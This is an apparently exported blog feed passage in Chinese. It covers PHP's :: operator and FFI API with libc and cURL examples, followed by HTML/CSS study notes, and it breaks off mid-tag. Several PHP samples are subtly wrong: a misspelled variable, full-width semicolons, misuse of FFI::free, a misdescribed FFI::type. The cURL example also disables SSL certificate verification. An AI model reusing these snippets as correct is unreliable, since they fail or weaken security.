<strong>父类的方法</strong>。它是一个非常重要的符号，广泛应用于面向对象编程（OOP）中。下面详细介绍 <code>::</code> 的几种主要用途。</p><p>PHP 中的 <code>::</code> 主要用于以下场景：</p><ol><li><strong>访问静态属性或静态方法</strong>：如 <code>ClassName::staticMethod()</code> 或 <code>ClassName::$staticVar</code>。</li><li><strong>访问类常量</strong>：如 <code>ClassName::CONSTANT_NAME</code>。</li><li><strong>调用父类方法</strong>：如 <code>parent::methodName()</code>。</li><li><strong>延迟静态绑定</strong>：如 <code>static::methodName()</code>。</li><li><strong>匿名类中的静态成员访问</strong>：如 <code>$anonClass::staticMethod()</code>。</li></ol><h3 id="FFI的妙用"><a href="#FFI的妙用" class="headerlink" title="FFI的妙用"></a>FFI的妙用</h3><h4 id="FFI-new"><a href="#FFI-new" class="headerlink" title="FFI::new()"></a>FFI::new()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FFI::new()创建一个新的 C 数据结构（如结构体、数组、基本类型等）</span></span><br><span class="line"><span class="comment">//签名</span></span><br><span class="line">FFI::<span class="keyword">new</span>(<span class="string">&quot;type&quot;</span>, <span class="keyword">bool</span> <span class="variable">$owned</span> = <span class="literal">true</span>, <span class="keyword">bool</span> <span class="variable">$persistent</span> = <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><ul><li><p>**<code>type</code>**：C 数据类型，可以是基本类型（如 <code>int</code>）、结构体（如 <code>struct timeval</code>）或数组（如 <code>int[10]</code>）。</p></li><li><p>**<code>$owned</code>**：默认为 <code>true</code>，表示 PHP 拥有该对象的内存，当 PHP 脚本结束时，自动释放该内存。如果为 <code>false</code>，表示外部（C 代码）拥有内存，PHP 不会释放它。</p></li><li><p>**<code>$persistent</code>**：用于指定是否分配持久内存。默认是 <code>false</code>，表示对象是临时的。</p></li></ul><h4 id="FFI-addr"><a href="#FFI-addr" class="headerlink" title="FFI::addr()"></a>FFI::addr()</h4><p>这个方法用于获取 C 数据结构的地址（类似于 C 语言中的 <code>&amp;</code> 操作符）。</p><ul><li><p>语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">addr</span>(<span class="variable">$c_data</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>$c_data</code>**：C 数据结构的对象，它可以是结构体、数组或基本类型。这个方法返回该对象的指针，可以用于传递给需要指针的 C 函数。</li></ul></li></ul><h4 id="FFI-cdef"><a href="#FFI-cdef" class="headerlink" title="FFI::cdef()"></a>FFI::cdef()</h4><p><code>cdef()</code> 是 FFI 的核心方法之一，它用于定义 C 函数、类型和结构体，并将它们与共享库链接起来。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;C_declarations&quot;</span>, <span class="string">&quot;shared_library_path&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>C_declarations</code>**：C 函数和结构体的声明。这个字符串包含标准 C 函数或结构体的声明。</li><li>**<code>shared_library_path</code>**：指定要链接的共享库路径（如 <code>libc.so.6</code> 或 <code>/usr/lib/libmylib.so</code>）。</li></ul></li></ul><h4 id="FFI-cast"><a href="#FFI-cast" class="headerlink" title="FFI::cast()"></a>FFI::cast()</h4><p><code>cast()</code> 方法用于将一个 C 数据指针或值转换为另一种 C 类型。类似于 C 语言中的类型转换。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">cast</span>(<span class="string">&quot;type&quot;</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>type</code>**：目标 C 类型（如 <code>int*</code> 或 <code>float</code>）。</li><li>**<code>$value</code>**：可以是一个指针、数字或结构体，FFI 会将其转换为指定类型。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ptr</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;int*&quot;</span>);</span><br><span class="line"><span class="variable">$int_ptr</span> = FFI::<span class="title function_ invoke__">cast</span>(<span class="string">&quot;int*&quot;</span>, <span class="variable">$ptr</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="FFI-sizeof"><a href="#FFI-sizeof" class="headerlink" title="FFI::sizeof()"></a>FFI::sizeof()</h4><p>sizeof()<code>方法用于返回指定 C 类型或对象的字节大小，类似于 C 语言中的</code>sizeof()</p><ul><li>**<code>$type_or_object</code>**：可以是一个 C 类型字符串或 C 数据结构实例，FFI 会返回该类型或对象的字节大小。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$size</span> = FFI::<span class="title function_ invoke__">sizeof</span>(<span class="string">&quot;int&quot;</span>);  <span class="comment">// 返回 int 的字节大小，通常为 4</span></span><br></pre></td></tr></table></figure><h4 id="FFI-alignof"><a href="#FFI-alignof" class="headerlink" title="FFI::alignof()"></a>FFI::alignof()</h4><p><code>alignof()</code> 方法返回给定 C 类型或对象的对齐要求。对齐是指数据在内存中的排列方式，通常与 CPU 的架构相关。</p><h4 id="FFI-memcpy"><a href="#FFI-memcpy" class="headerlink" title="FFI::memcpy()"></a>FFI::memcpy()</h4><p><code>memcpy()</code> 方法是一个内存复制函数，类似于 C 语言中的 <code>memcpy()</code>，用于将内存区域从源复制到目标。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">memcpy</span>(<span class="variable">$dst</span>, <span class="variable">$src</span>, <span class="variable">$size</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>$dst</code>**：目标地址，表示数据要复制到的内存位置。</li><li>**<code>$src</code>**：源地址，表示数据来源的内存位置。</li><li>**<code>$size</code>**：要复制的字节大小。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dst</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;char[20]&quot;</span>);</span><br><span class="line"><span class="variable">$src</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">FFI::<span class="title function_ invoke__">memcpy</span>(<span class="variable">$dst</span>, <span class="variable">$src</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$src</span>) + <span class="number">1</span>);  <span class="comment">// 将字符串复制到 dst</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="FFI-free"><a href="#FFI-free" class="headerlink" title="FFI::free()"></a>FFI::free()</h4><p><code>free()</code> 方法用于手动释放通过 <code>FFI::new()</code> 分配的内存。如果分配时设置 <code>$owned = false</code>，则必须通过 <code>free()</code> 来释放内存。</p><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">free</span>(<span class="variable">$c_data</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>$c_data</code>**：通过 <code>FFI::new()</code> 分配的 C 数据对象。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ptr</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;int[10]&quot;</span>);</span><br><span class="line">FFI::<span class="title function_ invoke__">free</span>(<span class="variable">$ptr</span>);  <span class="comment">// 手动释放内存</span></span><br></pre></td></tr></table></figure><h4 id="FFI-type"><a href="#FFI-type" class="headerlink" title="FFI::type()"></a>FFI::type()</h4><p><code>type()</code> 方法用于定义一个新的 C 类型，类似于在 C 语言中定义 <code>typedef</code>。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">type</span>(<span class="string">&quot;type&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>type</code>**：你想定义的 C 类型。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$int_ptr_type</span> = FFI::<span class="title function_ invoke__">type</span>(<span class="string">&quot;int*&quot;</span>);  <span class="comment">// 定义 int* 类型</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="FFI-isNull"><a href="#FFI-isNull" class="headerlink" title="FFI::isNull()"></a>FFI::isNull()</h4><p><code>isNull()</code> 方法用于检查一个 C 指针是否为空指针（<code>NULL</code>）。这在处理指针时非常有用。</p><ul><li><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI::<span class="title function_ invoke__">isNull</span>(<span class="variable">$ptr</span>);</span><br></pre></td></tr></table></figure><ul><li>**<code>$ptr</code>**：一个指针对象，用于检查是否为空指针。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ptr</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;int*&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (FFI::<span class="title function_ invoke__">isNull</span>(<span class="variable">$ptr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Pointer is NULL&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p> kali hyper-V</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install php-codesniffer</span><br><span class="line">code-oss --no-sanbox</span><br></pre></td></tr></table></figure><p>然后设置json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;phpcs.executablePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/phpcs&quot;</span></span><br></pre></td></tr></table></figure><p>检查是否配置ffi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -m | grep FFI</span><br><span class="line">vim /etc/php/(版本)/cli/php.ini</span><br><span class="line">ffi.enable = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="先来复现一下官方文档的"><a href="#先来复现一下官方文档的" class="headerlink" title="先来复现一下官方文档的"></a>先来复现一下官方文档的</h3><h4 id="hello"><a href="#hello" class="headerlink" title="hello!!"></a>hello!!</h4><p>先找一下libc的路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldconfig -p | grep libc.so.6</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(</span><br><span class="line">    <span class="string">&quot;int printf(const char *format, ...);</span></span><br><span class="line"><span class="string">    &quot;</span>,<span class="string">&quot;/path/libc.so.6&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fii</span>-&gt;<span class="title function_ invoke__">printf</span>(<span class="string">&quot;This is %s !!!&quot;</span>, <span class="string">&quot;FFI&quot;</span>)；</span><br><span class="line"><span class="comment">// This is FFI !!!</span></span><br><span class="line"><span class="comment">//... 表示的是 可变参数</span></span><br></pre></td></tr></table></figure><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>首先下载php的curl扩展</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install php-curl</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.baidu.com/&quot;</span>；</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>()；</span><br><span class="line"><span class="comment">//curl_init()函数用于初始化一个新的 cURL 会话，并返回一个句柄（资源类型），通过这个句柄 $ch 可以配置和执行具体的 cURL 操作。</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">// https的，所以会多一个设置SSL_VERIFYPEER的操作,意思是不校验ssl证书</span></span><br></pre></td></tr></table></figure><h4 id="gettimeofday"><a href="#gettimeofday" class="headerlink" title="gettimeofday()"></a>gettimeofday()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建 gettimeofday() 绑定</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    typedef unsigned int time_t;</span></span><br><span class="line"><span class="string">    typedef unsigned int suseconds_t;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    struct timeval &#123;</span></span><br><span class="line"><span class="string">        time_t      tv_sec;</span></span><br><span class="line"><span class="string">        suseconds_t tv_usec;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    struct timezone &#123;</span></span><br><span class="line"><span class="string">        int tz_minuteswest;</span></span><br><span class="line"><span class="string">        int tz_dsttime;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    int gettimeofday(struct timeval *tv, struct timezone *tz);    </span></span><br><span class="line"><span class="string">&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="comment">// 创建 C 数据结构</span></span><br><span class="line"><span class="variable">$tv</span> = <span class="variable">$ffi</span>-&gt;<span class="keyword">new</span>(<span class="string">&quot;struct timeval&quot;</span>);</span><br><span class="line"><span class="variable">$tz</span> = <span class="variable">$ffi</span>-&gt;<span class="keyword">new</span>(<span class="string">&quot;struct timezone&quot;</span>);</span><br><span class="line"><span class="comment">// 调用 C 的 gettimeofday()</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">gettimeofday</span>(FFI::<span class="title function_ invoke__">addr</span>(<span class="variable">$tv</span>), FFI::<span class="title function_ invoke__">addr</span>(<span class="variable">$tz</span>)));</span><br><span class="line"><span class="comment">// 访问 C 数据结构的字段</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$tv</span>-&gt;tv_sec);</span><br><span class="line"><span class="comment">// 打印完整数据结构</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$tz</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="C变量的操作"><a href="#C变量的操作" class="headerlink" title="C变量的操作"></a>C变量的操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建新的 C int 变量</span></span><br><span class="line"><span class="variable">$x</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;int&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>-&gt;cdata);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单赋值</span></span><br><span class="line"><span class="variable">$x</span>-&gt;cdata = <span class="number">5</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>-&gt;cdata);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复合赋值</span></span><br><span class="line"><span class="variable">$x</span>-&gt;cdata += <span class="number">2</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>-&gt;cdata);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 C 数据结构</span></span><br><span class="line"><span class="variable">$a</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;long[1024]&quot;</span>);</span><br><span class="line"><span class="comment">// 使用它就像使用常规数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$a</span>[<span class="variable">$i</span>] = <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="number">25</span>]);</span><br><span class="line"><span class="variable">$sum</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$n</span>) &#123;</span><br><span class="line">    <span class="variable">$sum</span> += <span class="variable">$n</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$sum</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(FFI::<span class="title function_ invoke__">sizeof</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&#x27;typedef enum _zend_ffi_symbol_kind &#123;</span></span><br><span class="line"><span class="string">    ZEND_FFI_SYM_TYPE,</span></span><br><span class="line"><span class="string">    ZEND_FFI_SYM_CONST = 2,</span></span><br><span class="line"><span class="string">    ZEND_FFI_SYM_VAR,</span></span><br><span class="line"><span class="string">    ZEND_FFI_SYM_FUNC</span></span><br><span class="line"><span class="string">&#125; zend_ffi_symbol_kind;</span></span><br><span class="line"><span class="string">&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;ZEND_FFI_SYM_TYPE);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;ZEND_FFI_SYM_CONST);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;ZEND_FFI_SYM_VAR);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ZEND_FFI_SYM_TYPE</code>：默认值是 <code>0</code>，因为它是第一个枚举项，没有明确指定值。</p><p><code>ZEND_FFI_SYM_CONST = 2</code>：显式指定为 <code>2</code>，跳过了 <code>1</code>。</p><p><code>ZEND_FFI_SYM_VAR</code>：由于 <code>ZEND_FFI_SYM_CONST</code> 是 <code>2</code>，因此 <code>ZEND_FFI_SYM_VAR</code> 自动取 <code>3</code>。</p><p><code>ZEND_FFI_SYM_FUNC</code>：紧随其后，自动取 <code>4</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习总结</title>
      <link href="/2024/02/26/HTML%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2024/02/26/HTML%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="标签语言毕竟不是真正的编程语言"><a href="#标签语言毕竟不是真正的编程语言" class="headerlink" title="标签语言毕竟不是真正的编程语言"></a>标签语言毕竟不是真正的编程语言</h1><p>直奔主题<br>小技巧：英文！+Tab可以在vscode一键生成html模板（当然，你需要下载对应插件并在设置打开）  </p><p>本文旨在记录一些易忘记的知识点。    </p><p>类选择器和id选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.data</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* class=&quot;data&quot; */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#apply</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* id=&quot;apply&quot; */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>字体样式和文本样式  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">字体类型<span class="attribute">font-family</span>，常用字体类型为serif；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字体风格<span class="attribute">font-style</span>，常使用italic设置字体倾斜；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字体粗细<span class="attribute">font-weight</span>，粗体可以设置为bold，粗细也可以用<span class="number">100</span>到<span class="number">900</span>的数值表示；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字体大小<span class="attribute">font-size</span>，设置字体大小为数字，紧跟长度单位，单位常用像素px。</span><br><span class="line"><span class="comment">/*********************************************/</span></span><br><span class="line"></span><br><span class="line">文本水平对齐 <span class="attribute">text-align</span>，默认值为左对齐<span class="attribute">left</span>，常用的还有右对齐<span class="attribute">right</span>，居中对齐center；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文本缩进<span class="attribute">text-indent</span>，用于指定文本的首行缩进，通常是将段落元素<span class="selector-tag">p</span>的首行缩进；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文本修饰<span class="attribute">text-decoration</span>，最常用的是设置值为<span class="attribute">none</span>，来清除&lt;<span class="selector-tag">a</span>&gt;标签的默认下划线，也可以给指定元素设置下划线，上划线、删除线等效果；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">行高<span class="attribute">line-height</span>，用于设置文本的行高，可以是数字和长度单位，比如<span class="number">32px</span>；也可以是单独数字，比如<span class="number">3</span>，表示为默认行高的<span class="number">3</span>倍。</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">&gt;注意区分后代选择器和分组选择器</span><br><span class="line">&gt;<span class="number">1</span>. <span class="selector-tag">p</span> <span class="selector-tag">h3</span> &#123;&#125;</span><br><span class="line">&gt;<span class="number">2</span>. <span class="selector-tag">p</span>, <span class="selector-tag">h3</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">定义列表和表格元素  </span><br><span class="line"></span><br><span class="line">```<span class="selector-tag">html</span></span><br><span class="line">&lt;<span class="selector-tag">dl</span>&gt;</span><br><span class="line">  &lt;<span class="selector-tag">dt</span>&gt;标题&lt;/<span class="selector-tag">dt</span>&gt;</span><br><span class="line">  &lt;<span class="selector-tag">dd</span>&gt;内容<span class="number">1</span>&lt;/<span class="selector-tag">dd</span>&gt;</span><br><span class="line">  &lt;<span class="selector-tag">dd</span>&gt;内容<span class="number">2</span>&lt;/<span class="selector-tag">dd</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">dl</span>&gt;  </span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">table</span>&gt;标签，定义一个表格元素；</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">tr</span>&gt;标签，定义表格中的行；</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">th</span>&gt;标签，定义表格中的表头单元格；</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">td</span>&gt;标签，定义普通的表格单元格。</span><br><span class="line">&lt;!-- 注意样式里设置表格边框是为<span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;&#125;  --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span><br><span class="line">  <span class="attribute">border-style</span>: solid;<span class="comment">/* 边框样式 */</span></span><br><span class="line">  <span class="attribute">border-collapse</span>: collapse;<span class="comment">/* 边框距 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合并单元格（表格）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> 